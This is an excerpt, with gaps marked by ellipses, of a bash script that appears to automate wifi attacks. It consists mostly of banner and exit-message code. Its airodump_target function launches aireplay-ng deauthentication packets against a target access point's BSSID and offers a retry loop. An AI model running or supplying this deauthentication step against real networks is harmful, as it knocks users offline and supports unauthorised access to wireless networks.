...
echo
print_star
for di in $(seq 1 $(((xter-24)/2)))
do 
echo -ne "${normal_color} "
done
echo -e "${normal_color}[Developed by: ${pink_color}ni_three]${normal_color}"
}
#---------------------------------------------------------------------------------------------------------------------------------------------------------------
...
echo -e "${green_color}Script exited successfully...${normal_color}"
print_star
for di in $(seq 1 $(((xter-24)/2)))
do 
echo -ne "${normal_color} "
...
echo -e "${normal_color}************************${normal_color}"
echo
exit
}
...
function airodump_target() {
	...
	xterm +j -geometry 86x24+0+0 -T "Sending deauthentication packets" -e aireplay-ng --deauth 25 -a ${tc_bssid} ${monitor_interface} --ignore-negative-one 
	...
	then 
		...
		clear
		echo -e "${normal_color}Press:\n${yellow_color}[e] ${normal_color}to exit the script\n${yellow_color}[ENTER] ${normal_color}to try again"
		read -r at_choice
		if [[ "$at_choice" = "e" ]] || [[ "$at_choice" = "E" ]]; then
			exit_script
		else
			airodump_target
		fi
